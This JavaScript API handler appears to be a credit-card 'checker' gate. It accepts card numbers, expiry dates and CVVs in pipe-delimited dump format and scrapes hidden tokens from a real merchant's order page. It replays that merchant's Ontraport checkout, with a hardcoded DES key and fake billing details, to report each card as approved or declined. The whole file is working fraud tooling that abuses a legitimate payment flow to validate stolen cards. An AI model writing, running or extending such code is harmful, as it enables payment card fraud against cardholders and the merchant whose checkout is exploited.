import fetch from 'node-fetch';
import crypto from 'crypto';

export default async function handler(req, res) {
    if (req.method !== 'POST') {
        return res.status(405).json({ error: 'Method not allowed' });
    }

    const { cc, user_id, gate } = req.body;
    const [number, month, year, cvv] = cc.split('|');
    const cleanNumber = number.replace(/\D/g, '');
    const cleanMonth = month.padStart(2, '0');
    const cleanYear = year.length === 2 ? `20${year}` : year;
    const cleanCVV = cvv;

    try {
        const result = await ontraportCheck(cleanNumber, cleanMonth, cleanYear, cleanCVV);
        return res.status(200).json(result);
    } catch (error) {
        return res.status(500).json({
            status: 'declined',
            result: `❌ ${error.message}`
        });
    }
}

async function ontraportCheck(number, month, year, cvv) {
    const year2 = year.slice(-2);

    function desEncrypt(key, data) {
        const cipher = crypto.createCipheriv('des-ecb', Buffer.from(key, 'utf8'), null);
        let encrypted = cipher.update(data, 'utf8', 'hex');
        encrypted += cipher.final('hex');
        return '0x' + encrypted;
    }

    // 1. GET initial page
    const session = await fetch('https://kiyosakiresearch.com/TKL-OF', {
        headers: {
            'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8'
        }
    });
    const html = await session.text();

    const uid = extractHidden(html, 'uid');
    const mopsbbk = extractHidden(html, 'mopsbbk');
    const mopbelg = extractHidden(html, 'mopbelg');
    const mr_opsblck = extractHidden(html, 'mr_opsblck') || '0xba5c1d70f2e284b38030e28edccecf20478d9ea257301d3271e985728953812f765da1ecbeff26547d6f83f00679d993422992185b368b003baff9b197afedb0820fb55d6522bf51';
    const sess_ = extractHidden(html, 'sess_') || '';

    // 2. Get token
    const tokenRes = await fetch('https://forms.ontraport.com/v2.4/ccpci/www/tokenize.php', {
        method: 'POST',
        headers: {
            'Content-Type': 'application/x-www-form-urlencoded',
            'Origin': 'https://forms.ontraport.com',
            'Referer': 'https://kiyosakiresearch.com/TKL-OF'
        },
        body: new URLSearchParams({
            payment_name: '',
            payment_number: number,
            payment_expire_month: month,
            payment_expire_year: year2,
            payment_code: cvv,
            aid: 'YOUR_AID',
            blockId: 'YOUR_BLOCKID',
            hash: 'YOUR_HASH'
        })
    });
    const tokenData = await tokenRes.json();
    const token = tokenData.token || '';

    // 3. Build form data
    const formData = {
        firstname: 'John',
        lastname: 'Doe',
        email: 'test@email.com',
        sms_number: '1234567890',
        address: '123 Main St',
        address2: '',
        country: 'US',
        state: 'CA',
        city: 'Los Angeles',
        zip: '90210',
        shipping_same_as_billing: 'off',
        shipping_address1: '',
        shipping_address2: '',
        shipping_city: '',
        shipping_state: '',
        shipping_country: '',
        shipping_zip: '',
        f1806: 'on',
        mr_opsblck: mr_opsblck,
        orderform_block: 'true',
        mopsbbk: mopsbbk,
        mopbelg: mopbelg,
        uid: uid,
        afft_: '',
        aff_: '',
        sess_: sess_,
        ref_: '',
        own_: '',
        oprid: '',
        contact_id: '',
        utm_source: '',
        utm_medium: '',
        utm_term: '',
        utm_content: '',
        utm_campaign: '',
        referral_page: '',
        _op_gclid: '',
        _op_gcid: '',
        _op_gsid: '',
        _op_gsn: '',
        _fbc: '',
        _fbp: '',
        _op_li_fat_id: '',
        _op_last_gclid: '',
        _op_last_gbraid: '',
        _op_last_wbraid: '',
        _op_last_google_click_at: '',
        visiting_contact_id: '0',
        card_number: number,
        uses_external_payment_element: '',
        external_payment_element_token: token,
        payment_expire_month: month,
        payment_expire_year: year2,
        payment_code: cvv
    };

    const encrypted = desEncrypt('Un1cOrns', JSON.stringify(formData));

    // 4. Submit
    const mr_rand = Math.floor(Math.random() * 9000000) + 1000000;
    const finalRes = await fetch('https://forms.ontraport.com/v2.4/cc_verify.php', {
        method: 'POST',
        headers: {
            'Content-Type': 'application/x-www-form-urlencoded',
            'Origin': 'https://forms.ontraport.com',
            'Referer': `https://forms.ontraport.com/v2.4/cc_verify.php?mr_rand=${mr_rand}&uid=${uid}&submitAttempts=1&parent_url=${encodeURIComponent('https://kiyosakiresearch.com/')}`
        },
        body: new URLSearchParams({
            hash: encrypted,
            mr_rand: mr_rand,
            uid: uid,
            submitAttempts: '1',
            parent_url: 'https://kiyosakiresearch.com/'
        })
    });

    const finalText = await finalRes.text();

    // 5. Parse result
    const msgMatch = finalText.match(/const message = '([^']+)'/);
    if (msgMatch) {
        try {
            const parsed = JSON.parse(msgMatch[1].replace(/\\'/g, "'"));
            if (parsed.result_code === 0) {
                return {
                    status: 'approved',
                    result: `✅ ${parsed.message || 'Approved'}`
                };
            } else {
                return {
                    status: 'declined',
                    result: `❌ ${parsed.message || 'Declined'}`
                };
            }
        } catch {
            return {
                status: 'declined',
                result: `❌ ${msgMatch[1]}`
            };
        }
    }

    return {
        status: 'declined',
        result: '❌ Unknown response'
    };
}

function extractHidden(html, name) {
    const regex = new RegExp(`name="${name}"[^>]*value="([^"]*)"`);
    const match = html.match(regex);
    return match ? match[1] : '';
}
